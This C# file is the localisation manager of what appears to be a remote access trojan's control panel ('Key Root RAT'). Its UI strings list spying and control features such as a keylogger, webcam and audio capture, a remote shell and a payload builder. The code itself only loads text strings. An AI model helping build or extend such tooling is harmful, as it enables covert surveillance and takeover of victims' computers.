using System;
using System.Collections.Generic;
using System.IO;
using Newtonsoft.Json;

namespace RAT.ControlPanel.Resources
{
    public class LanguageManager
    {
        private static LanguageManager instance;
        private Dictionary<string, string> currentLanguage;
        private string currentLanguageCode = "en";
        
        public static LanguageManager Instance
        {
            get
            {
                if (instance == null)
                {
                    instance = new LanguageManager();
                }
                return instance;
            }
        }
        
        private LanguageManager()
        {
            LoadLanguage("en");
        }
        
        public void LoadLanguage(string languageCode)
        {
            try
            {
                string langFile = $"Resources/lang_{languageCode}.json";
                
                if (File.Exists(langFile))
                {
                    string json = File.ReadAllText(langFile);
                    currentLanguage = JsonConvert.DeserializeObject<Dictionary<string, string>>(json);
                    currentLanguageCode = languageCode;
                }
                else
                {
                    // 기본 영어 언어 사용
                    currentLanguage = GetDefaultEnglish();
                    currentLanguageCode = "en";
                }
            }
            catch
            {
                currentLanguage = GetDefaultEnglish();
                currentLanguageCode = "en";
            }
        }
        
        public string GetString(string key)
        {
            if (currentLanguage != null && currentLanguage.ContainsKey(key))
            {
                return currentLanguage[key];
            }
            return key; // 키를 찾을 수 없으면 키 자체를 반환
        }
        
        public string CurrentLanguage => currentLanguageCode;
        
        private Dictionary<string, string> GetDefaultEnglish()
        {
            return new Dictionary<string, string>
            {
                // Main Form
                {"MainForm_Title", "Key Root"},
                {"Listen", "Listen"},
                {"Stop", "Stop"},
                {"Build", "Build"},
                {"Settings", "Settings"},
                {"View", "View"},
                {"About", "About"},
                {"Logs", "[Logs]"},
                
                // View Menu
                {"LargeScreen", "Large Screen"},
                {"Details", "Details"},
                
                // Context Menu
                {"ClientConfig", "Client Config"},
                {"Information", "Information"},
                {"System", "System"},
                {"Manager", "Manager"},
                {"Terminal", "Terminal"},
                {"Shell", "Shell"},
                {"WMI", "WMI"},
                {"Desktop", "Desktop"},
                {"Webcam", "Webcam"},
                {"Audio", "Audio"},
                {"FunStuff", "FunStuff"},
                {"Misc", "Misc"},
                {"KeyLogger", "KeyLogger"},
                {"ChatMessage", "Chat Message"},
                {"RunScript", "Run Script"},
                {"Power", "Power"},
                {"Batch", "Batch"},
                {"LockScreen", "Lock Screen"},
                {"Connection", "Connection"},
                {"Reconnect", "Reconnect"},
                {"Disconnect", "Disconnect"},
                {"Local", "Local"},
                {"OpenFolder", "Open Folder"},
                {"HighLight", "High Light"},
                {"Yes", "Yes"},
                {"No", "No"},
                
                // ListView Columns
                {"Screen", "Screen"},
                {"OnlineID", "OnlineID"},
                {"Username", "Username"},
                {"IPAddress", "IP Address"},
                {"Admin", "Admin"},
                {"OS", "OS"},
                {"Ping", "Ping"},
                {"CPU", "CPU"},
                {"Monitor", "Monitor"},
                {"ActiveForm", "ActiveForm"},
                
                // Status Bar
                {"ServerRunning", "Server: Running (Port {0})"},
                {"ServerStopped", "Server: Stopped"},
                {"Clients", "Clients: {0}/{1}"},
                
                // Messages
                {"ServerStarted", "Server started on port {0}."},
                {"ServerStopped_Msg", "Server stopped."},
                {"ServerStartFailed", "Failed to start server: {0}"},
                {"SelectClient", "Please select a client."},
                {"NoOnlineClients", "No online clients."},
                
                // Settings
                {"Settings_Title", "Settings"},
                {"Language", "Language"},
                {"English", "English"},
                {"Korean", "한국어"},
                {"Save", "Save"},
                {"Cancel", "Cancel"},
                {"Reset", "Reset"},
                {"SettingsSaved", "Settings saved successfully!"},
                {"SettingsSaveFailed", "Failed to save settings: {0}"},
                {"ConfirmReset", "Are you sure you want to reset all settings to default?"},
                {"ResetComplete", "Settings reset to default values."},
                
                // About
                {"About_Message", "Key Root RAT v1.0\n\n100% C# Implementation\n108 Features, 23 Handlers"}
            };
        }
    }
}
